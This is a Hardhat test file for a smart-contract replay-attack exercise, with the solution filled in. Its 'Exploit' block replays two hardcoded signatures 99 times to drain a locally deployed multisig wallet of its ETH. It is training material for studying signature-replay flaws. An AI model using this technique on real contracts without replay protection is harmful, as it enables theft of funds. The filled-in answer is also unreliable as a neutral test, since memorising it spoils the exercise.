const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('Replay Attack Exercise 1', function () {


    let deployer, signer2, attacker;
    const ETH_IN_MULTISIG = ethers.utils.parseEther("100");
    const ATTACKER_WITHDRAW = ethers.utils.parseEther("1");

    before(async function () {
        /** SETUP EXERCISE - DON'T CHANGE ANYTHING HERE */

        [deployer, signer2, attacker] = await ethers.getSigners();

        // Deploy multi sig
        const MultiSigWallet = await ethers.getContractFactory(
            'contracts/replay-attack-1/MultiSignatureWallet.sol:MultiSignatureWallet',
            deployer
        );
        // const MultiSigWallet = await ethers.getContractFactory(
        //     'contracts/replay-attack-1/solution/MultiSignatureWalletSecured.sol:MultiSignatureWalletSecured',
        //     deployer
        // );
        this.multiSigWallet = await MultiSigWallet.deploy([deployer.address, signer2.address]);

        // Send ETH to multisig Wallet
        await deployer.sendTransaction({ to: this.multiSigWallet.address, value: ETH_IN_MULTISIG });

        // Prepare withdraw Message
        const message = ethers.utils.solidityPack(["address", "uint256"], [attacker.address, ATTACKER_WITHDRAW]);
        const messageBuffer = ethers.utils.concat([message]);

        // Sign message
        let signatory1Signature = await deployer.signMessage(messageBuffer);
        let signatory2Signature = await signer2.signMessage(messageBuffer);
        
        // Split signatures (v,r,s)
        let signatory1SplitSig = ethers.utils.splitSignature(signatory1Signature);
        let signatory2SplitSig = ethers.utils.splitSignature(signatory2Signature);
        
        // Call transfer with signatures
        await this.multiSigWallet.transfer(attacker.address, ATTACKER_WITHDRAW, [signatory1SplitSig, signatory2SplitSig]);
        
        expect(await ethers.provider.getBalance(this.multiSigWallet.address)).to.equal(
            ETH_IN_MULTISIG.sub(ATTACKER_WITHDRAW))

        this.attackerBalanceBeforeAttack = await ethers.provider.getBalance(attacker.address);
    });

    it('Exploit', async function () {
        /** CODE YOUR SOLUTION HERE */
        
        let signature1 = {
            r: '0x02efb15972bac0ba578c0f95623bd95d10ca5f601d1d999308187e7dae738733',
            s: '0x213c76c501b9d9d5d4e81215ba15f1feb6e78be070dbca257f2b61d163e84255',
            v: 28,
        }

        let signature2 = {
            r: '0x132e7ee1157ea4d2638187b2244202d8088a39cc7293a6895dfdf7fcfd3172ae',
            s: '0x18146aa45b156b100b280a91da1df53b533d7ec4e7d2c1740d0fe0e031ef8056',
            v: 28,
        }

        for(let i=1; i<= 99; i++) {
            console.log("Withdrawing 1 ETH")
            await this.multiSigWallet.connect(attacker).transfer(
                attacker.address, ATTACKER_WITHDRAW, [signature1, signature2]
            );
        }

    });

    after(async function () {
        /** SUCCESS CONDITIONS */

        expect(await ethers.provider.getBalance(this.multiSigWallet.address)).to.equal(0)

        let attackerBalanceAfterAttack = await ethers.provider.getBalance(attacker.address);
        
        // Attacker is supposed to own the stolen ETH ( +99 ETH , -0.1 ETH for gas)
        expect(attackerBalanceAfterAttack).to.be.gt(this.attackerBalanceBeforeAttack.add(
            ETH_IN_MULTISIG).sub(ethers.utils.parseEther("1.1")));
    });
});